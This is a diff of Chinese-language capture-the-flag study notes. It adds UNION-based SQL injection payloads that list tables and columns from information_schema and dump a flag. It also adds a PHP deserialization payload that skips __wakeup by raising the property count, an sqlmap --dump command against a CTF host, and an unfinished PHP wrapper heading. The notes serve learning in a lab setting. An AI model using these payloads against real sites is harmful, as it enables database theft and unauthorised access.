@@ -18,13 +18,25 @@
 
 ​	union select 1,database(),group_concat(**table_name**)from information_schema.tables where table_schema=**database()**--+
 
+```
+union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()--+
+```
+
+
+
 4. 再利用范式从表名中找到列名    （结果为fllllag）
 
    union select 1,database(),group_concat(**column_name**)from information_schema.columns where table_name=**'fl4g'**--+
 
+   ```
+   union select 1,database(),group_concat(column_name)from information_schema.columns where table_name='fl4g'--+
+   ```
+
+   
+
 5. 最后利用select从列名中找到flag
 
-   union select 1,group_concat(fllllag)from fl4g--+
+   union select 1,database(),group_concat(fllllag)from fl4g--+
 
 
 
@@ -79,5 +91,19 @@
 
    熟悉吗？接下来加粗部分同SQL注入即可
 
+#### 反序列化
 
+如何跳过__wakeup函数？
+
+O:6:"HaHaHa":***3***:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
+
+如上所示 对象本该只有两个属性 admin 和 passwd ，将数量设置为3即可在反序列化中跳过wakeup函数。
+
+#### sqlmap
+
+python sqlmap.py -u "http://node4.anna.nssctf.cn:28366/?id=1" --dump
+
+#### PHP伪协议
+
+如何传入文件？
 
